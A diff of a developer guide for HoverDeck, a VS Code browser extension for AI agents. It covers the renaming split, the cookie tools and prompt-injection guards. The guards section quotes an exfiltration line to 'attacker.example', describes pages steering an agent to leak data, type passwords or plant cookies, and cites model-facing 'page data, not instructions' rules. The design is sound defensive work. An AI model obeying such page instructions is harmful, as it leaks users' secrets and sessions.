@@ -1,4 +1,4 @@
-# AI Browser — baseline working version
+# HoverDeck — baseline working version
 
 **Status: this version works. It builds from scratch with zero errors and is a good starting
 point.** New functionality gets built on top of it. When changing anything, preserve the
@@ -10,10 +10,58 @@ The extension is a fork of `simple-browser` from the microsoft/vscode monorepo, 
 a standalone project and renamed. Every tie to the monorepo (gulp, shared esbuild helpers,
 `../../node_modules`) has been removed.
 
-Published as `DenysDavydov.tab-browser-ultimate` — the package `name` (and so the extension
-id and the marketplace slug) is `tab-browser-ultimate`, while everything user-visible says
-"AI Browser": `displayName`, the command `category`, and the `aiBrowser.*` identifiers. Open
-VSX carries it; the VS Code Marketplace cannot, because of the API proposals.
+Published as `DenysDavydov.hoverdeck` (package `name` `hoverdeck`), on Open VSX only — the VS
+Code Marketplace cannot carry it, because of the API proposals. Every contributed id and every
+setting is `hoverdeck.*`. Parts of this file still say "AI Browser" for the product and name
+`aiBrowser.*` ids from before the split: read them as HoverDeck and `hoverdeck.*`.
+
+## HoverDeck, split from AI Browser
+
+**Split on 2026-11-14.** This repository (`github.com/Denis-Davidoff/hoverdeck`) builds
+**HoverDeck alone**. AI Browser (`DenysDavydov.tab-browser-ultimate`), the build it grew out of,
+is frozen at commit 238fc22 in `github.com/Denis-Davidoff/vs-code-tab-browser-ultimate`; a
+backup of the tree as it was with both builds is
+`../vscode-ai-browser-pre-split-2026-11-14.tar.gz`. AI Browser copies installed before the move
+poll that old repository for updates and see no later release.
+
+- **Gone with the split**: the flavor machinery (`scripts/flavor.mjs`, `package-flavor.mjs`,
+  `package.hoverdeck.json`, `src/core/contributionIds.ts`, `setFlavor`), and the features for
+  agents outside our chat — Connect Claude Code / Codex / Gemini / OpenCode, Check Connection,
+  Add … to Claude Code / Codex, Share Tab with one agent, Copy Recording Prompt, their submenus
+  and repeat buttons. They are no longer in the manifest; some of their code is still registered
+  in `extension.ts` and is unreachable (no menu, no palette entry). Every agent works in our chat
+  and its terminal tabs, and nothing is written into the user's repository.
+- **[src/core/flavor.ts](src/core/flavor.ts)** keeps the names the code reads (`productName()`
+  is `HoverDeck`, `mcpServerName()` is `hoverdeck`, `hasExternalAgents()` is `false`,
+  `contributionId` is the identity). The leaf readers of tool names (`isBrowserServer` ×2, the
+  Gemini name regex) still accept **both** `ai-browser` and `hoverdeck`: a migrated chat or an
+  old config may say either. Do not narrow them.
+- **Kept on purpose under the old spelling**: the `X-AI-Browser-*` HTTP headers, the
+  `ai-browser-cup` icon ids, page globals (`__aiBrowser*`, `aiBrowserLogins`, `Symbol.for`
+  keys), the private root `~/.ai-browser`, and the `panel/aiBrowser*.ts` file names. None is
+  shared with another extension.
+- **Migration ([src/setup/migration.ts](src/setup/migration.ts)), run first in `activate`:**
+  - **Settings**: every `hoverdeck.<x>` the manifest declares is filled from `aiBrowser.<x>` in
+    the user's, the workspace's and each folder's `settings.json`, only where unset, once
+    globally (`hoverdeck.migration.settings`) and once per workspace. The old values stay: AI
+    Browser may still be installed and reading them.
+  - **HoverDeck's own pre-split keys** (`aiBrowser.*` in its own `globalState`,
+    `workspaceState` and `SecretStorage`) are copied to `hoverdeck.*` where absent.
+  - **AI Browser's state** (chat history, toolbar skills, saved logins, MCP tokens) belongs to
+    AI Browser's extension id and can only be handed over by AI Browser itself, through an
+    `exportState` on its `activate` result. **No released AI Browser has one** (0.9.23, the
+    last, does not), so today only settings move. The reader is kept for a release that adds it.
+  - **Webview `localStorage`** (`aiBrowser.chat.*`, `aiBrowser.terminal.*`, per device) is
+    copied to `hoverdeck.*` where unset in the first statements of `preview-src/chat.ts`.
+- **With AI Browser installed beside it** both run: two globe dropdowns, two status items, two
+  MCP servers (the port walk falls through), and of the two `Cmd+Alt+C` bindings only one fires.
+  `hoverdeck.removeAiBrowserEntries` (status bar `$(tools) Remove old AI Browser entries`, item
+  `hoverdeck.oldEntries`) takes AI Browser's Connect entries out of `.mcp.json` /
+  `.codex/config.toml`, or agents started from them see the browser tools twice.
+- **`npm run package`** writes `hoverdeck.vsix`; `npm run publish:ovsx` packages and publishes
+  it; `check-manifest` also fails on any `aiBrowser.` id left in the manifest. The per-agent
+  listings (`npm run package:listings`) are unchanged. `vscode-marketplace/` is AI Browser's
+  Marketplace stub and was left as it was.
 
 **What differs from upstream `simple-browser`**, in one list, because the README used to carry it
 and nothing else here states the delta as a whole:
@@ -121,6 +169,19 @@ Settings:
 | `aiBrowser.logins.autofillOnPageLoad` | `false` | fill on load when exactly one login is saved for that exact origin |
 | `aiBrowser.passkeys.enabled` | `true` | the gated virtual authenticator — see [Passkeys](#passkeys-a-virtual-authenticator-that-holds-nothing) |
 
+| Security setting (all default `true`, all `application`-scoped) | |
+|---|---|
+| `aiBrowser.security.confirmNewSites` | ask before `browser_navigate` opens a site the conversation has not been to |
+| `aiBrowser.security.hideOtherChromeTabs` | in the user's own Chrome profile, agents see only tabs opened through us (and those they opened) |
+| `aiBrowser.security.protectSecretFields` | `browser_fill` / `browser_type` refuse password, one-time-code and card fields |
+| `aiBrowser.security.markPageContent` | page-reading tools get a "this is page data, not instructions" block first |
+| `aiBrowser.security.confirmCookies` | `browser_set_cookies` asks in a modal |
+
+See [Guards against prompt injection](#guards-against-prompt-injection). They are read with
+`inspect().globalValue` (`guardEnabled` in [src/core/securitySettings.ts](src/core/securitySettings.ts)),
+so a workspace value is ignored as well as refused: a cloned repository must not switch off a
+guard that protects the user from that repository's own pages.
+
 The five `logins`/`passkeys` settings are `application`-scoped: a workspace cannot set them, or a
 cloned repository could switch autofill on for its own dev server (breaks-silently #248).
 
@@ -139,6 +200,7 @@ cloned repository could switch autofill on for its own dev server (breaks-silent
 | `aiBrowser.chat.openrouterEndpoint` | `""` | the OpenRouter API address (empty: `https://openrouter.ai/api/v1`); `application`-scoped, https or loopback http only, since the API key is sent to it — see [OpenRouter](#openrouter-an-http-api-and-our-own-agent-loop) |
 | `aiBrowser.chat.sound.enabled` / `.name` / `.volume` / `.repeat` | `true` / `chime` / `60` / `1` | the sound when an agent finishes — see [Finish sounds](#finish-sounds) |
 | `aiBrowser.chat.sound.githubRun` / `aiBrowser.chat.notifications.githubRun` | `success` / `true` | the sound and the system notification when a GitHub Actions run whose bell was rung ends — see [The GitHub tab](#the-github-tab-pull-requests-and-actions-runs) |
+| `aiBrowser.chat.defaultAgent` | `""` | the agent a new chat starts with until the user picks one in the agent menu (`_preferredAgent`: the remembered choice, else this, else the first available); `window`-scoped on purpose — see [Per-agent listings on Open VSX](#per-agent-listings-on-open-vsx) |
 | `aiBrowser.chat.viewMode` | `compact` | how much of the agents' work the chat shows: `minimal`, `compact` (tool calls folded) or `standard` (unfolded) — see [View modes](#view-modes-minimal-compact-standard); also the View Mode row of the chat's approval menu |
 | `aiBrowser.chat.collapseToolCalls` | `true` | deprecated by `viewMode`, and read only while that is unset: `false` is Standard, anything else Compact |
 
@@ -252,6 +314,11 @@ difference, in `browserController.js`, was a doc comment whose link had been upd
 - [src/logins/secretGuards.ts](src/logins/secretGuards.ts) — password values kept from the MCP tools: redaction, value-probing selectors (leaf, under test)
 - [src/logins/vaultData.ts](src/logins/vaultData.ts) — the vault's shape, origin matching, save-or-update, merging (leaf, under test)
 - [src/logins/vaultSeal.ts](src/logins/vaultSeal.ts) — the encrypted export: scrypt and AES-256-GCM (leaf, under test)
+- [src/logins/cookieParse.ts](src/logins/cookieParse.ts) — pasted cookies in every common format, and their CDP parameters (leaf, under test)
+- [src/logins/cookiePaste.ts](src/logins/cookiePaste.ts) — the Paste Cookies into Page… command
+- [src/browser/cookieAccess.ts](src/browser/cookieAccess.ts) — setting and listing a tab's cookies, and the agent's site rule (leaf, under test)
+- [src/browser/siteApproval.ts](src/browser/siteApproval.ts) — which sites an agent may open without asking (leaf, under test)
+- [src/core/securitySettings.ts](src/core/securitySettings.ts) — the `aiBrowser.security.*` switches, read from the user's settings only
 - [src/logins/loginCsv.ts](src/logins/loginCsv.ts) — CSV from and to Chrome, Firefox, Safari, Bitwarden, 1Password (leaf, under test)
 - [src/translate/translate.ts](src/translate/translate.ts) — Translate Page: the tab, the language picker, the prompt on the clipboard
 - [src/translate/translateText.ts](src/translate/translateText.ts) — languages, the prompt, checks on what the assistant writes back (leaf, under test)
@@ -275,6 +342,7 @@ difference, in `browserController.js`, was a doc comment whose link had been upd
 - [src/chat/exchangeChat.ts](src/chat/exchangeChat.ts) — one chat shared with a hosted Exchange server over an outgoing WebSocket
 - [src/chat/exchangeProtocol.ts](src/chat/exchangeProtocol.ts) — the two remote commands, the server address rule, the text-only snapshot (leaf, under test)
 - [src/chat/chatProtocol.ts](src/chat/chatProtocol.ts) — the messages between the chat's webview and the host (types only, read by both builds)
+- [src/chat/attachmentText.ts](src/chat/attachmentText.ts) — badged text in a form that outlives its draft: the ↑ history and the clipboard (leaf, under test, read by both builds)
 - [src/chat/agents.ts](src/chat/agents.ts) — the agent interface, and detecting which agents are installed
 - [src/chat/agentBinary.ts](src/chat/agentBinary.ts) — where `claude` and `codex` are, and which copy to use
 - [src/chat/agentProcess.ts](src/chat/agentProcess.ts) — a CLI speaking one JSON object per line
@@ -3263,6 +3331,8 @@ pass"). Seven tools in [src/mcp/chatTools.ts](src/mcp/chatTools.ts), answered by
 | `chat_keep_awake` | the chat's own agents | a timer (rounded up to the popup's choices), until the agents finish (`tab` = their own, or `window`), or off — **off for every surface** |
 | `chat_pause` / `chat_resume` | the chat's own agents | hold or release **their own** tab's queue |
 | `chat_stop_agent` | the chat's own agents | one running agent or background skill run **of their own tab** |
+| `chat_play_sound` | the chat's own agents | one of the 50 chat sounds (or the user's own), 1–5 times, in **their own** tab's surface |
+| `chat_alert` | the chat's own agents | calls the user: a system notification (asked, so even with VS Code focused), a warning card in the conversation and a sound |
 
 Decisions, each with its reason:
 
@@ -3293,6 +3363,35 @@ Decisions, each with its reason:
 - **Keep-awake uses the `SleepControl` of the caller's surface**, since `working(tabId)` looks at
   its own tabs; `chat_state` names any other surface holding the computer (`alsoHeldBy`).
 - **Text is cut by code point** (`capAt`): a lone surrogate is refused by Codex's JSON reader.
+- **Sounds and alerts travel in the tab summary, so they reach every surface showing the tab**
+  (asked for: "everywhere possible"). `ChatViewProvider._signal` stores a `ChatTabSignal`
+  (`id`, `at`, sound, repeat, alert title and text) under the tab and posts; `tabs` is `shared`,
+  so the editor's view, Chrome and the website all see it, and each surface's `tabs` holds only
+  its own tabs, so only the owning surface plays. The view (`agentSignals` in `chat.ts`) plays a
+  signal it has not seen and that is under 60 s old — the first state only seeds what was seen, so
+  a reload replays nothing. The editor's host shows the OS notification itself
+  (`osNotify(…, asked = true)`); the website shows a browser `Notification`
+  (`requireInteraction`, permission asked on the first press); **Chrome plays nothing**, leaving it
+  to VS Code on the same machine, as it does for finish sounds. The alert's card is `chat_notify`'s
+  warning card. **At most five a minute per tab**, refused past that with a sentence the model can
+  act on. The tool answers whether a surface was there to play it (`played`). Both are on the
+  no-card read list in `agentProtocol.ts` — the user's own Sound settings and Chat Settings → MCP
+  govern them, not an approval. `chatToolSounds` repeats `chatSounds` (chatTools.ts may not value-
+  import the protocol), held equal by `chatToolSounds.test.ts`, which reads the source as text.
+- **Chat Settings → MCP switches parts of the server off** (asked for: "not all, only some, like
+  these alerts and sounds"). `src/mcp/mcpFeatures.ts` (leaf, under test) maps nine groups to tools
+  — sounds, alerts, cards (`chat_notify`, `chat_progress`, `chat_update_plan`,
+  `chat_present_result`, `chat_present_json`, `chat_cite`), keep-awake, chat control, recording,
+  annotations, cookies, editor; the browser, terminals and the chat's reads are not offered. The
+  choice is `aiBrowser.mcp.disabledFeatures` (`application`, read with `inspect().globalValue`,
+  the guards' rule: a workspace must not change what agents are offered), and
+  `DispatchContext.toolOff` applies it at every request: `tools/list` leaves the tools out, and a
+  call is refused with `featureOffMessage` before `run` — a client lists tools at session start,
+  so the refusal is what makes a change take effect at once. The tab (`createMcpFeatureSettings`,
+  `mcpFeatures` message with `load`/`set`, `_mcpFeatures` in `chatView.ts`) is editor-only in
+  `commands.ts`; each switch writes the user setting at once, and a configuration change reposts
+  to a ready view. `McpFeatureId` in `chatProtocol.ts` and the manifest's `enum` repeat the ids;
+  `mcpFeatures.test.ts` holds the three equal. Add a group there, not a per-tool switch.
 
 Verified: the category and the Gemini fallback under `npm test`; the compiled tools through
 `dispatch` with a stubbed chat (reads and refusals for an outside caller, own-tab arguments, a
@@ -4686,6 +4785,116 @@ page script applies it any more.
 button and takes a `browser_screenshot` sees the password on screen. Sharing a tab with an
 assistant is sharing what that tab can show.
 
+### Cookies pasted into a page
+
+Asked for: some services refuse to sign in inside the editor's browser or a Chrome started for
+debugging, so the user copies the cookies from a browser where the session exists and puts them
+into the tab. Two ways in, one rule set:
+
+- **The user: Paste Cookies into Page…** (`aiBrowser.pasteCookies`, [src/logins/cookiePaste.ts](src/logins/cookiePaste.ts))
+  in the browser tab's dropdown (`3_logins@2`, and inside the logins submenu) and in the status bar
+  menu's *Logins and passkeys* section. It acts on `browser.userTab` (a VS Code or a Chrome tab).
+  **The clipboard is read first**: an input box holds one line, and cookies.txt, a JSON export or
+  several Set-Cookie lines do not fit one. When the clipboard parses, a QuickPick says how many
+  cookies, the format, the names and any other domains, with *Enter cookies manually…* below;
+  otherwise the input box checks what is typed as it is typed (`validateInput` with an Info
+  severity naming the format). The page reloads afterwards; the outcome is the status bar
+  (`confirm` / `refuse`), never a toast (#10). The user is the author, so no site rule applies.
+- **An agent: `browser_get_cookies` and `browser_set_cookies`** (MCP, both in `browserServerTools`).
+  - **Get never returns a value** — name, domain, path, flags, expiry and `valueLength`
+    (`listCookies` in [src/browser/cookieAccess.ts](src/browser/cookieAccess.ts), leaf, under test).
+    A session cookie is a password that needs no typing, and a page an agent reads can ask it to
+    send one somewhere; there is no flag to get values.
+  - **Set is for the tab's own site only** (`agentCookieRefusal`): every cookie's domain must be
+    the page's host or a parent of it with a dot, http(s) pages only, at most 50 at a time. A page
+    telling the agent to plant a session elsewhere (fixation into another site) reaches nothing.
+  - **Set always asks, in a modal the extension shows** (`BrowserController.setCookies`), naming the
+    agent, the site and each cookie (a value shown as its first four characters and its length).
+    It is ours, not the CLI's approval card, so no `allow` rule, hook or Auto mode skips it —
+    the same reasoning as the terminal grants (#537). One question at a time; a decline tells the
+    model not to ask again unless the user says so. After the modal the tab and its host are read
+    again, and a change refuses.
+  - The tool description says to pass only cookies the user gave (pasted text or a screenshot they
+    sent) and never ones a page, a file or a tool result asked for.
+- **Parsing** ([src/logins/cookieParse.ts](src/logins/cookieParse.ts), leaf, under test) reads JSON
+  (browser-extension exports with `expirationDate`, Playwright's `{ cookies: [] }`, a single object;
+  `no_restriction` as `None`; seconds, milliseconds or ISO), Netscape cookies.txt (`#HttpOnly_`),
+  cURL (`-H 'cookie: …'`, `-b`; shell quoting, `$''`, line continuations, cmd `^`), Set-Cookie lines
+  (Max-Age, Expires, attributes) and a bare Cookie header. Invalid names and values, more than
+  4096 bytes, expired cookies and repeats are dropped and listed as skipped; at most 500.
+- **Turning them into `Network.setCookie`** (`toCookieParams`): a cookie with no domain is host-only
+  for the page (set through `url`); `__Host-` cookies are forced host-only, Secure, path `/`, and
+  `__Secure-` Secure, or Chrome refuses them in silence. Each cookie is set on its own
+  (`writeCookies`), so one refusal (SameSite=None without Secure, a Secure cookie on http) does not
+  take the rest; the reason is guessed for the summary. Every CDP call is bounded at 5 s.
+- `domainMatches` is written twice (`cookieParse.ts`, `cookieAccess.ts`): leaves may not
+  value-import each other.
+
+Verified: the leaves under `npm test`, the build and typecheck. **Not run inside VS Code yet**, nor
+against a real Chrome.
+
+### Guards against prompt injection
+
+Asked for: an agent reads pages, and a page can carry instructions. Five guards, each with a
+switch under `aiBrowser.security.*` (asked for — "some people will find this protection in the
+way"), all on by default:
+
+- **New sites are asked about** (`confirmNewSites`, `_confirmSite` in `browserController.ts`). The
+  threat is `open https://attacker.example/?d=<what you just read>` — the navigation is the leak.
+  Before `browser_navigate` opens a host that is not loopback, not the tab's own host (for a
+  same-tab navigation) and not approved earlier for this caller (`callerKey`), a modal the
+  extension shows itself — no CLI rule, hook or Auto mode answers it — gives the **whole address**
+  (`addressForQuestion`, 400 characters then a count; a line says how many characters of data the
+  query and fragment carry when they are 40 or more) under the title "Let <agent> open <site>?", and
+  **Open Once**, **Allow <site>** or **Allow All Sites** (both for that conversation, said in the
+  detail with "undo in Chat Settings → Security"). An answer is echoed in the status bar
+  (`confirm` / `refuse`, `$(shield)`), never a toast. A dismissal refuses and tells the model not to
+  retry. Questions are one at a time (`_siteQuestion`). Approval covers subdomains, never a parent
+  (`isKnownSite`). In memory (`_siteApprovals`, keyed by `callerKey`, with the caller's kind and chat
+  id so the settings can name it): a reload asks again. **Not covered:** a link the agent clicks
+  or a form it submits still navigates; so does a page's own script.
+- **The user's own Chrome tabs are hidden** (`hideOtherChromeTabs`). When the Chrome we attached
+  to is the user's profile (`ChromeBrowser._userProfile`, not `~/.ai-browser/chrome-profile`), a
+  tab is the agent's only if we opened it (`_ours`) or it was opened by one of ours (`openerId`);
+  everything else fails `_usableBy` for every caller and is refused by id with its own sentence.
+  A tab the user **shares** is resolved before `_usableBy`, so sharing still hands it over. The
+  user's own commands (no caller) see everything.
+- **Secret fields are typed by the user** (`protectSecretFields`, `refuseProtectedField`): before
+  `browser_fill` or `browser_type` writes, the target's `type`, `name`, `id` and `autocomplete` are
+  read and `isProtectedField` (`secretGuards.ts`: `isSecretField` plus `cc-number`, `cc-csc`,
+  `cc-exp*` and the words cvv/cvc/csc/card number) refuses it. A page could otherwise ask the agent
+  to "re-enter the password here".
+- **Page content is marked as data** (`markPageContent`): tools with `untrusted: true` —
+  `browser_snapshot`, `browser_inspect_element`, `browser_selected_element`, `browser_html`,
+  `browser_text`, `browser_console` — get `untrustedNote` as a **separate text block before** the
+  result (`dispatch`, when `DispatchContext.markUntrusted`). A block of its own, not a prefix inside
+  the JSON, so the result still parses. This is a hint to the model, not a boundary.
+- **Cookies are asked about** (`confirmCookies`): the `browser_set_cookies` modal. Off, the site
+  rule (`agentCookieRefusal`) still holds.
+
+**Where they are switched: Chat Settings → Security** (asked for: "ideal UX, convenient and clear"),
+`createSecuritySettings` in `chat.ts`, `_securitySettings` / `_postSecurity` in `chatView.ts`, one
+`securitySettings` message with `action` `load`, `set`, `allOn` or `forget`, editor-only in
+`commands.ts`. A summary card on top (green "All protections are on", orange "N protections are
+off" naming them, with **Turn all on** under the text, left-aligned with it; the tab itself has no icon, like the others); one card of rows, each a tinted icon, its title and a switch at the right, with, under the title, what it
+does while on and what turning it off lets an agent do — the off text is shown, orange, while it is
+off; then **Sites agents may open**: each conversation's approvals (`siteApprovals()`, labelled
+`<agent> · <chat title>`), a chip per site and an orange **Any site** chip, each with an ×, a
+**Forget** per conversation and **Forget all** (`forgetSites`). Each switch applies at once and is
+written by `setGuard` (on removes the user value, off writes `false`, Global). The view is reposted
+on `aiBrowser.security` changes and `onDidChangeSiteApprovals`, to a ready view only. The status bar
+menu has a **Security** row before Settings (`$(shield)`, or `$(warning)` with "N protections are
+off") that runs the internal `aiBrowser.securitySettings`: the chat's Security tab (`openSettings`
+with `tab: 'security'`), or VS Code's settings filtered to `aiBrowser.security` where the chat
+cannot open. The refusals and modals name "Chat Settings → Security" as where to change them.
+`SecurityGuardId` in `chatProtocol.ts` repeats the five names, since the webview may not import
+`securitySettings.ts` (it imports `vscode`). Not run inside VS Code yet.
+
+**Appearance, Sound & notifications and Connections & permissions use the same card** (asked for): `settingsRow(icon, title, control, note?)` and `settingsCard(title, …rows)` in `chat.ts` build the Security tab's rows — a tinted icon, title and note, the control at the right; a lone checkbox becomes the switch and the whole row its label, selects and the volume slider sit in `.settings-row-control`. A row whose control is disabled is dimmed with `.muted` by its section ("Only when the window is not focused").
+
+**Not built:** turning a conversation that has read a page from Auto to Ask for the terminal and
+file categories ("tainted" sessions). The new-site question covers the main exfiltration route.
+
 ### Not built
 
 - **No MCP tool fills a saved login.** An assistant signing in to a dev app without seeing the
@@ -4806,14 +5015,14 @@ the first entry — and entries, each a `## <version> — <date>` heading over a
 first. The welcome shows the introduction under the title, centred in the panel, then **the
 features worth trying** (asked for) — bullets placed between the introduction and the first entry,
 each written exactly `- $(codicon) **Name** — one line`, drawn as icon, bold name, dash and text
-above "Show changelog"; a bullet of any other shape there is skipped, and an icon name that is not
+above "Show changelog"; a bullet of any other shape there is skipped. **An announcement that must not be missed is a `> ` quote there instead** (`> $(codicon) **Name** — text`, `notices` in `ChatNews`), drawn above the features as a yellow-edged card (`.welcome-notice`); inside an entry a `> ` line is a highlight, listed first and marked in the changelog (`highlights`, `.news-highlight`). The AI Browser build uses it for the split into AI Browser and HoverDeck, and an icon name that is not
 a plain codicon id draws `star` — and the newest six entries in small print as "What's new". The file is read once from the installed
 extension (`extensionUri`), not from a workspace, so it always describes the build that is
 running; it ships in the VSIX like README.md, and a change reaches users with the next release.
 [src/chat/news.ts](src/chat/news.ts) reads it (leaf, under test, including a test that the shipped
 file parses), forgivingly: comments are skipped, entries without items are dropped, and a file
-that cannot be read leaves the welcome its own one-line text. **Add an entry with every release
-that ships something a user would notice**; the authoring notes are in the file's own comment.
+that cannot be read leaves the welcome its own one-line text. **Each build has its own file**: HoverDeck reads `NEWS.hoverdeck.md` (falling back to `NEWS.md` if it is missing), AI Browser `NEWS.md` (`_readNews` in `chatView.ts`); both ship in both VSIXs. HoverDeck's must not announce the AI Browser-only commands (Connect …, Add … to Claude Code / Codex, Copy Recording Prompt) — `news.test.ts` checks it. **Add an entry with every release
+that ships something a user would notice**, in each file it concerns; the authoring notes are in the file's own comment.
 **And [CHANGELOG.md](CHANGELOG.md) with it**, one short paragraph per version, newest first: the
 README's own *Changelog* section fell four releases behind (0.7.0–0.7.3) while NEWS.md kept up, and
 moved to that file when the README was cut back; the README links to it under *More*. Keep the
@@ -4864,6 +5073,21 @@ list starts at the number the model wrote — and inline code, bold, italics and
 recursively so `` **`npm test`** `` shows no backticks. A line over 4 000 characters is shown as
 plain text: the inline pattern backtracks on long runs of backticks or `[` (0.5–0.9 s for 40 000
 of them), and a streaming reply is re-rendered every 40 ms.
+
+**A ` ```paste ` block is text for the user to paste elsewhere** (asked for: a ticket comment
+inside a long reply had to be selected by hand). `pasteBlock` in `chat.ts` draws a fence whose
+language is `paste` or `clipboard` as rendered Markdown in a green frame, the rest of the fence
+line as its title, with a Copy button that is always shown. Copy puts the block's Markdown
+source on `text/plain` and its rendered HTML (`selectionTree` → `treeHtml`) on `text/html`
+through `copyRich` (`chatSelection.ts`): a one-off capture-phase `copy` listener filled by
+`execCommand('copy')`, stopped so the selection handler does not overwrite it, falling back to
+the host's text-only `copy`. Agents are told with every message (`pasteBlockInstruction` in
+`chatTab.ts`, sent beside the visualization instruction, so only where that one is), including
+to use four backticks when the content holds a code fence — a three-backtick fence inside would
+close the block. **Models do not always follow that**, so a paste block reads its content as
+Markdown with nesting (`fenceEnd(…, nested)`): a fence with an info string inside it (` ```text `)
+opens an inner block, and the next bare fence closes that one, not the paste block. Only a bare
+inner block of the same length still ends the paste block early. **Not run inside VS Code yet.**
 
 **Links open, and a click chooses where** (asked for): a click opens the address in the built-in
 browser through `aiBrowser.show` — so `useIntegratedBrowser` and the grant decide as everywhere
@@ -5674,8 +5898,8 @@ from `execute`), or disabling `execute`.
 
 **Not measured:** a live paid-model turn after the permission fix (the free models ran out of quota on 2026-10-27 — the
 turn scenarios of `test-opencode.mjs` then fail at "shell asked as Terminal" with `Free usage limit reached`, which is the
-quota and not a defect; `opencode run -m opencode/big-pickle "hi"` shows it); browser tools inside an OpenCode terminal tab
-(no MCP config is injected); the Chrome and Exchange surfaces. **To re-measure** after an update: run
+quota and not a defect; `opencode run -m opencode/big-pickle "hi"` shows it); a model calling the browser tools in an
+OpenCode terminal tab (only the MCP handshake was measured, against a fake server); the Chrome and Exchange surfaces. **To re-measure** after an update: run
 `scripts/test-opencode.mjs` with `OC_MODEL=<a model with quota>`, then repeat the `.env` and `fetch` probes above.
 
 ### Pi over its RPC mode
@@ -5703,7 +5927,7 @@ as Codex does), or the tab reads as working for good; an exit during startup is 
 process still in its handshake.
 
 **Not measured:** a Stop pressed after the process is ready and before the prompt is sent (the abort is a no-op; only the
-5 s kill timer ends it, as "Stopped."); steering while the final answer streams; browser tools inside a Pi terminal tab;
+5 s kill timer ends it, as "Stopped."); steering while the final answer streams; a model calling the browser tools in a Pi terminal tab (only the handshake was measured);
 Pi receives `AIB_MCP_TOKEN` in its environment, which an approved `bash env` would show to the model (the Codex terminal
 hand-over has the same exposure). **To re-measure** after an update: `scripts/test-pi.mjs`, and re-read `dist/utils/paths.js`.
 
@@ -5750,8 +5974,16 @@ commit message on either of these runs on one of those instead.
   `piPath` (a `node` on `PATH`) like its chat process.
 - **Terminal tabs and "Continue in VS Code terminal"**: both agents' own TUI starts in the folder (`opencode`, `pi`);
   resume is `opencode -s <id>` (the session ref is OpenCode's own id) and `pi --session <id>` (from the same folder, or Pi
-  asks to fork). **Browser tools are not injected into either terminal** — Pi's would need the gate loaded in the TUI and
-  OpenCode's an MCP config, neither measured; the terminal-tab menu row says "no browser tools in a terminal".
+  asks to fork). **Both get the browser tools** (`_browserCliLaunch`), measured against a fake MCP server: OpenCode
+  through `OPENCODE_CONFIG_CONTENT` — `{ mcp: { <server>: { type: 'remote', url, headers } } }`, merged by OpenCode over
+  the user's own config, the header values written as `{env:AI_BROWSER_MCP_AUTH}` / `{env:AI_BROWSER_MCP_TAB}` so the
+  token is in the environment only; Pi through `-e <file>`, a server-only extension (`piTerminalExtension`, sharing
+  `piMcpRegistration` with the gate) in `~/.ai-browser/shared/runtime/pi/`, `0600`, holding no secret — url, token,
+  server name and tab come from `AIB_MCP_*` / `AIB_TAB`. **Known and left: a second OpenCode TUI reuses the first's
+  `opencode serve --service`**, and with it the first one's MCP config (measured, OpenCode 2.1.1: two TUIs with
+  different tokens, every request carried the first's). One window's terminals share a token, so this matters only for
+  OpenCode terminals of two windows running at once: the second reaches the first window's server and browser. The
+  service ends with the last TUI.
 - **Pi's path normalisation is part of the approval** (review, measured on Pi 1.4.0): Pi strips one leading `@` and turns
   Unicode spaces into spaces before it resolves a path, so `read` of `@/etc/hosts` reads `/etc/hosts`. `outsideProject` took
   `@/etc/hosts` for a project-relative name and the gate auto-allowed the read with no card (and an `edit` of
@@ -6095,7 +6327,11 @@ send `/rev`). Escape closes it and it stays closed until the text changes. **A q
 matches hides the palette and hands every key back to the box** (`no-match`): typed mid-text, a
 `/usr/bin` or a `$5` is far more often not a command, and a popup saying "Nothing matches" over
 it — or swallowing ↑ and Enter — was in the way. `a/b` never opens it: the sigil has to follow a
-space. Choosing a skill writes it into the box, never sends it, so arguments can follow. Typed, it
+space. **Or an attachment badge's closing `]`** (`inlineToken`): a badge is inserted with no space
+after it unless a word follows, so `/` typed right after one opened nothing until a space was typed;
+the command chosen there gets a space before it. **The inline palette hangs from the message part
+(`inputArea`), not the whole composer**: under Skills, Activity or another composer tab the composer
+also holds that panel, and the palette opened above it, far from the caret. Choosing a skill writes it into the box, never sends it, so arguments can follow. Typed, it
 takes the place of what was typed and is written in the agent's own form whichever sigil was used
 (`$one` in a Claude chat becomes `/one-more-review`). From the button, Claude's goes at the start of
 the message, over a `/command` already there, since Claude Code reads a command only there — one
@@ -6237,22 +6473,37 @@ the folder and GitHub rows only, and nothing is chosen by default, query or not 
   Clicking a file opens `vscode.diff` through the built-in Git extension's public `toGitUri`
   API: Staged compares HEAD with index, Unstaged compares index with the working file. Added
   and deleted files use an empty side; renames use their original path on the left (`gitDiff.ts`).
-  Mixed changes offer **Commit staged** or **Commit all changes**. Under **Commit all changes** is a **Commit all changes & Push** twin, and whenever something is staged **Commit staged (N) & Push** stands last in the window, below every note and button (asked for, after an earlier version without it)
+  The footer is one row per choice (asked for, minimal): **Commit staged** (accent, with its file count) and, while unstaged files exist too, **Commit all** (secondary), each with a small **Push** button on its right that commits and then pushes; under them one line names the agent writing the message, or why nothing can be done. With nothing staged there is only **Stage all files**; with no changes, "Working tree clean"
   (`gitCommit` with `push: true`): after a successful commit, and once the Git lock is released, `_pushAfterCommit`
   runs the Branches window's own `push` — or `publish` when the branch has no upstream — through `_gitRemoteAction`,
   with every question and check of that path; a question or an error opens the Branches window (`pushAfterCommit`). An empty index first offers
   **Stage all files**; the host defaults to staged-only and never implicitly stages on that path.
+  **The message can be written by hand** (asked for): the footer's hint line ends in a
+  `Write message` link that opens a textarea between the file list and the commit buttons
+  (`gitMessageBox`, built once and outside `gitPopupActions`, so a Git refresh never rebuilds
+  it away, #365); ⌘/Ctrl+Enter there commits the staged files, and the link becomes `Let
+  <agent> write it`. With it open no agent is asked or needed — Commit waits only for text —
+  and `gitCommit` carries `message`, which the host checks with `manualCommitMessage`
+  (`gitCommit.ts`: CRLF to LF, trailing spaces off, blank lines off both ends, 20 000
+  units at most, no NUL; refused otherwise) and commits verbatim. The text outlives the
+  window closing and is cleared only once its commit was seen running and ended without an
+  error, or when the folder changes.
   Commit generates a message using the chat's selected agent, model and effort, then runs
   `git commit`. The text request runs separately without tools or conversation history. The default
   prompt asks for a subject `type(TASK-ID): summary` — a conventional type, the ticket key only when
   the branch name or recent subjects carry one (never invented), else `type: summary` — and the
   context names the branch for that (`commitContext`'s `Branch:` line). The prompt is written twice,
-  `defaultFeaturePrompts` and `instructions` in `commitMessage.ts`; change both. A changed
